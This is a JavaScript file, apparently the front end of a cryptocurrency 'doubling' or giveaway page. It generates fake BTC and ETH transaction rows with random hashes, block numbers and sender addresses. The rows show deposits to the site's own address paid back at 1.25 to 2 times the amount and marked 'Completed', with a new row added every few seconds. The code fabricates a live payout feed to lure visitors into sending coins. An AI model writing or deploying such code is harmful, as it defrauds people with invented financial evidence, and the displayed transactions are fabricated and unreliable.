$(document).ready(function () {
    function randomString(len, charSet) {
        charSet = charSet || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var randomString = "";
        for (var i = 0; i < len; i++) {
            var randomPoz = Math.floor(Math.random() * charSet.length);
            randomString += charSet.substring(randomPoz, randomPoz + 1);
        }
        return randomString;
    }
    
    var btcR = ["1","bc1"];
    var randomBtc = btcR[Math.floor(Math.random() * btcR.length)];
    function customerBtc(len, charSet) {
        charSet = charSet || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var customerBtc = randomBtc+"";
        for (var i = 0; i < len; i++) {
            var randomPoz = Math.floor(Math.random() * charSet.length);
            customerBtc += charSet.substring(randomPoz, randomPoz + 1);
        }
        return customerBtc;
    }
    
     function customerEth(len, charSet) {
        charSet = charSet || "ABCDEFabcdef0123456789";
        var customerEth = "0x"+"";
        for (var i = 0; i < len; i++) {
            var randomPoz = Math.floor(Math.random() * charSet.length);
            customerEth += charSet.substring(randomPoz, randomPoz + 1);
        }
        return customerEth;
    }

    var rounded = function(number){
        return +number.toFixed(7);
    }

    function randomInteger(min, max) {
        let rand = (min + Math.random()) * (max - 1 - min) +1;
        return Math.floor(rand);
    }

    function randomIntegerModified(min, max) {
        let rand = (Math.random() * (min - max) + max).toFixed(5) //random (Multiplier) gets calculated with 0-1 * (min-max) + max and then reduced  to 5 decimal digits
        return rand; //Multiplier gets returned
    }

    function randomIntegera(min, max) {
        let rand = min + Math.random() * (max + 1) - min;
        return Math.floor(rand);
    }

    function createTableItem() {
        let coin = randomIntegera(0, 1) ? "ETH" : "BTC";

        let inputValue = coin == "ETH" ? (randomInteger(-0.9, 1.1))+"."+randomString(5, "123456789") : (randomInteger(0.5, 1))+"."+randomString(5, "123456789");
        let address = coin == "BTC" ? $("input[name=address_btc]").val() : $("input[name=address_eth]").val();

        inputValuee = coin == "ETH" ? (inputValue - 1) : (inputValue - 1);
        inputValue = (inputValuee).toFixed(5)
        let outputValue = ++inputValue * randomIntegerModified(1.25, 2.0); //Output gets declared as Input * RandomNumber between min and max
        let fee = inputValue / 100000;
        outputValue = coin == "ETH" ? outputValue.toFixed(5) : (outputValue).toFixed(5);
        fee = rounded(fee);

	    let custAddy = coin == "ETH" ? customerEth(42) : customerBtc(26);
	    let custAddyHash = coin == "ETH" ? "0x"+randomString(42) : randomString(64);

        let row = `<div class="transactions-item">
                <p class="txhash">${custAddyHash + "..."}</p>
                <p class="block">${randomString(6, "123456789")}</p>
                <p class="from">${custAddy + "..."}<br>${address}</p>
                <div class="arrow"><img src="img/check.gif" alt=""></div>
                <p class="to">${address}<br>${custAddy + "..."}</p>
                <p class="value">${inputValue.toFixed(5)} ${coin}<br>${outputValue} ${coin}</p>
                <p class="fee">${fee.toFixed(8)}</p>
                <p class="status">Completed</p>
            </div>`;
        $(row).hide().prependTo(".transactions-content").fadeIn("slow");
        $('.transactions-item:eq(5)').remove();
    }

    createTableItem();
    createTableItem();
    createTableItem();
    createTableItem();
    createTableItem();
    
    setInterval(createTableItem, 6250);
    $('a[href^="#"]').click(function () {
        var target = $(this).attr('href');
        $('html, body').animate({scrollTop: $(target).offset().top - 50}, 500);
        return false;
    });
});

function copy(text) {
    var input = document.createElement('textarea');
    input.innerHTML = text;
    document.body.appendChild(input);
    input.select();
    var status = document.execCommand('copy');
    document.body.removeChild(input);

    if(status) {
        $(".address-done").fadeIn();
        setTimeout(() => $(".address-done").fadeOut(200), 1500);
    }
}